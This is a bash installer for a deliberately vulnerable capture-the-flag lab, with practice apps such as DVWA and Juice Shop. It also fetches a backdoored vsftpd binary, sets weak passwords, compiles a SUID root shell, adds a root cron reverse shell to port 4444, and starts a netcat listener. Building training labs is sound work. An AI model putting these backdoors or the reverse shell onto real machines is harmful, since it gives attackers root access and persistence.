#!/bin/bash
# Vuln Lab Autoinstaller by EthicalHackerGPT
# Tested on Ubuntu 20.04 / 22.04
set -e

echo "[+] Installing dependencies..."
apt update && apt install -y apache2 php php-mysqli mariadb-server git unzip curl vsftpd openssh-server \
    nodejs npm netcat gcc g++ build-essential libcap2-bin

echo "[+] Starting MySQL service..."
systemctl start mysql

echo "[+] Securing MySQL with default password..."
MYSQL_ROOT_PW="rootpass"
mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '${MYSQL_ROOT_PW}';"
mysql -uroot -p${MYSQL_ROOT_PW} -e "FLUSH PRIVILEGES;"
mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';"
mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE DATABASE dvwa;"
mysql -uroot -p${MYSQL_ROOT_PW} -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"

echo "[+] Installing DVWA..."
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
sed -i "s/'root'/'dvwa'/; s/''/'p@ssw0rd'/" /var/www/html/dvwa/config/config.inc.php

echo "[+] Installing bWAPP..."
mkdir -p /var/www/html/bwapp
wget https://sourceforge.net/projects/bwapp/files/latest/download -O /tmp/bwapp.zip
unzip /tmp/bwapp.zip -d /var/www/html/bwapp
mv /var/www/html/bwapp/bWAPP/* /var/www/html/bwapp/
mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE DATABASE bwapp;"
mysql -uroot -p${MYSQL_ROOT_PW} -e "GRANT ALL ON bwapp.* TO 'dvwa'@'localhost';"

echo "[+] Installing Mutillidae..."
git clone https://github.com/webpwnized/mutillidae.git /var/www/html/mutillidae

echo "[+] Installing Juice Shop..."
mkdir -p /opt/juice-shop
cd /opt/juice-shop
git clone https://github.com/bkimminich/juice-shop.git .
npm install
nohup npm start &

echo "[+] Installing vsftpd 2.3.4 (backdoored)..."
wget https://github.com/andresriancho/vsftpd-2.3.4-backdoor/raw/master/vsftpd-2.3.4 -O /usr/sbin/vsftpd
chmod +x /usr/sbin/vsftpd
cat <<EOF > /etc/vsftpd.conf
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
EOF
useradd -m ftpuser -s /bin/bash
echo "ftpuser:12345" | chpasswd
systemctl restart vsftpd || /usr/sbin/vsftpd &

echo "[+] Adding weak SSH user..."
useradd hacker -m -s /bin/bash
echo "hacker:hackme" | chpasswd

echo "[+] Adding SUID root shell..."
echo -e '#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash"); return 0;}' > /tmp/rootshell.c
gcc /tmp/rootshell.c -o /usr/local/bin/rootshell
chmod 4755 /usr/local/bin/rootshell
rm /tmp/rootshell.c

echo "[+] Creating cronjob reverse shell..."
echo "* * * * * root bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /etc/crontab

echo "[+] Creating flags..."
mkdir -p /opt/flags /var/tmp/.hidden

echo "FLAG{dvwa_root_pwned}" > /opt/flags/flag1.txt
echo "FLAG{ftp_backdoor_triggered}" > /var/tmp/.hidden/ftp_flag.txt
echo "FLAG{juice_shop_xss}" | base64 > /opt/flags/juice_flag.b64
echo "FLAG{mysql_dump_success}" > /root/mysql_flag.txt
echo "FLAG{reverse_shell_callback}" > /opt/flags/rev_flag.txt

chmod 600 /opt/flags/*.txt /root/mysql_flag.txt
chmod 640 /var/tmp/.hidden/ftp_flag.txt
chown root:root /opt/flags/*.txt /root/mysql_flag.txt
chown ftpuser:ftpuser /var/tmp/.hidden/ftp_flag.txt

echo "[+] Creating scoreboard logger..."
mkdir -p /opt/scripts
cat <<'EOF' > /opt/scripts/log_score.sh
#!/bin/bash
echo "$(date) - FLAG found: $1 by user: $(whoami)" >> /var/log/scoreboard.log
EOF
chmod +x /opt/scripts/log_score.sh

echo "[+] Starting netcat listener on port 4444..."
nohup nc -lvnp 4444 > /opt/reverse_shell.log 2>&1 &

echo "[+] Restarting services..."
systemctl restart apache2 mysql

echo ""
echo "🎉 DONE! Vuln lab is ready to rock:"
echo "  [1] DVWA        → http://<IP>/dvwa"
echo "  [2] bWAPP       → http://<IP>/bwapp"
echo "  [3] Mutillidae  → http://<IP>/mutillidae"
echo "  [4] Juice Shop  → http://<IP>:3000"
echo ""
echo "Services:"
echo "  [SSH]    user: hacker | pass: hackme"
echo "  [FTP]    user: ftpuser | pass: 12345"
echo "  [SUID]   /usr/local/bin/rootshell"
echo "  [RevShell]  Port: 4444 (localhost only by default)"
echo ""
echo "Flags placed in:"
echo "  /opt/flags, /var/tmp/.hidden/, /root"
echo "Scoreboard logger: /opt/scripts/log_score.sh"
echo "Happy Hacking!"
